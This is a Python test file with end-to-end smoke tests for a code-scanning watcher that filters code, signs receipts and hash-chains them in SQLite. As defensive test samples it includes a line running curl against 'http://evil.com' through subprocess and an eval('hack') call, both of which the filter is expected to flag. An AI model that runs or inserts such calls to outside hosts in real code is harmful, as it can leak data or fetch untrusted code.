"""End-to-end smoke tests: filter → sign → chain → verify round-trip."""

import json
import hashlib
import sqlite3
import time

from agent_xray_watcher import (
    check_causal_filter,
    sign_receipt,
    verify_receipt,
    get_tee_measurement,
)


def _init_db(db_path):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS receipts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT,
            status TEXT NOT NULL,
            receipt_json TEXT NOT NULL,
            violation_log JSON,
            hash_chain TEXT
        )
    """)
    conn.commit()
    conn.close()


def _insert_receipt(db_path, file_path, status, receipt_data, violations=None):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    receipt_json = json.dumps(receipt_data, ensure_ascii=False)
    violation_json = json.dumps(violations) if violations else None

    c.execute("SELECT hash_chain FROM receipts ORDER BY id DESC LIMIT 1")
    row = c.fetchone()
    prev_hash = row[0] if row else ""

    chain_hash = hashlib.sha256(
        (prev_hash + receipt_json).encode("utf-8")
    ).hexdigest()

    c.execute(
        "INSERT INTO receipts "
        "(timestamp, file_path, status, receipt_json, violation_log, hash_chain) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (timestamp, file_path, status, receipt_json, violation_json, chain_hash),
    )
    conn.commit()
    conn.close()
    return chain_hash


class TestE2ECleanFile:
    """End-to-end: clean code → Green receipt → signed → chained."""

    def test_clean_code_full_pipeline(self, tmp_path):
        code = "def greet(name):\n    return f'Hello, {name}!'\n"
        # 1. Filter
        passed, summary, violations = check_causal_filter(code)
        assert passed is True

        # 2. Build receipt
        diff_hash = hashlib.sha256(code.encode()).hexdigest()
        cs = {
            "filePath": "/test/greet.py",
            "diffHash": diff_hash,
            "filterResult": {"pass": passed, "reason": summary},
            "violation_log": violations,
        }
        sig = sign_receipt(cs)
        receipt = {
            "@context": "https://www.w3.org/ns/credentials/v2",
            "type": ["SovereignReceipt"],
            "issuer": "Aletheia-Core Watcher",
            "credentialSubject": cs,
            "TEE_Measurement_Hash": get_tee_measurement(),
            "Causal_Filter_Signature": sig,
        }

        # 3. Verify signature
        assert verify_receipt(cs, sig) is True

        # 4. Persist and verify chain
        db = str(tmp_path / "smoke.sqlite")
        _init_db(db)
        chain_hash = _insert_receipt(db, "/test/greet.py", "Green", receipt)
        assert len(chain_hash) == 64

        # 5. Verify stored data
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute("SELECT status, receipt_json FROM receipts WHERE id = 1")
        status, rj = c.fetchone()
        conn.close()
        assert status == "Green"
        stored = json.loads(rj)
        assert stored["Causal_Filter_Signature"] == sig


class TestE2EDangerousFile:
    """End-to-end: dangerous code → Red receipt → violations logged."""

    def test_dangerous_code_full_pipeline(self, tmp_path):
        code = "import subprocess\nsubprocess.call(['curl', 'http://evil.com'])\n"
        # 1. Filter
        passed, summary, violations = check_causal_filter(code)
        assert passed is False
        assert len(violations) >= 2

        # 2. Build quarantine receipt
        diff_hash = hashlib.sha256(code.encode()).hexdigest()
        cs = {
            "filePath": "/test/evil.py",
            "diffHash": diff_hash,
            "filterResult": {"pass": passed, "reason": summary},
            "violation_log": violations,
        }
        sig = sign_receipt(cs)
        receipt = {
            "@context": "https://www.w3.org/ns/credentials/v2",
            "type": ["SovereignReceipt", "QuarantineReceipt"],
            "issuer": "Aletheia Sovereign Node",
            "credentialSubject": cs,
            "Causal_Filter_Signature": sig,
        }

        # 3. Verify signature
        assert verify_receipt(cs, sig) is True

        # 4. Persist and verify chain
        db = str(tmp_path / "smoke.sqlite")
        _init_db(db)
        _insert_receipt(db, "/test/evil.py", "Red", receipt, violations)

        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute("SELECT status, violation_log FROM receipts WHERE id = 1")
        status, vlog = c.fetchone()
        conn.close()
        assert status == "Red"
        stored_violations = json.loads(vlog)
        assert len(stored_violations) >= 2


class TestE2EMultipleFilesChain:
    """End-to-end: multiple files processed sequentially form valid chain."""

    def test_mixed_files_chain_integrity(self, tmp_path):
        db = str(tmp_path / "smoke.sqlite")
        _init_db(db)

        files = [
            ("/test/clean.py", "x = 1\n", True),
            ("/test/bad.py", "eval('hack')\n", False),
            ("/test/ok.py", "print('hello')\n", True),
        ]

        for fpath, code, expect_pass in files:
            passed, summary, violations = check_causal_filter(code)
            assert passed is expect_pass
            diff_hash = hashlib.sha256(code.encode()).hexdigest()
            cs = {
                "filePath": fpath,
                "diffHash": diff_hash,
                "filterResult": {"pass": passed, "reason": summary},
                "violation_log": violations,
            }
            sig = sign_receipt(cs)
            receipt = {
                "@context": "https://www.w3.org/ns/credentials/v2",
                "type": ["SovereignReceipt"],
                "issuer": "Aletheia-Core Watcher",
                "credentialSubject": cs,
                "Causal_Filter_Signature": sig,
            }
            assert verify_receipt(cs, sig) is True
            _insert_receipt(
                db, fpath,
                "Green" if passed else "Red",
                receipt,
                violations if violations else None,
            )

        # Verify full chain
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute("SELECT id, receipt_json, hash_chain FROM receipts ORDER BY id ASC")
        rows = c.fetchall()
        conn.close()

        prev_hash = ""
        for rid, receipt_json, stored_hash in rows:
            computed = hashlib.sha256(
                (prev_hash + receipt_json).encode("utf-8")
            ).hexdigest()
            assert computed == stored_hash, f"Chain broken at row {rid}"
            prev_hash = stored_hash

        assert len(rows) == 3


class TestTEEMeasurement:
    """TEE measurement hash edge cases."""

    def test_tee_measurement_is_sha256_hex(self):
        h = get_tee_measurement()
        assert len(h) == 64
        int(h, 16)  # valid hex

    def test_tee_measurement_consistent(self):
        """Same hardware → same measurement."""
        h1 = get_tee_measurement()
        h2 = get_tee_measurement()
        assert h1 == h2
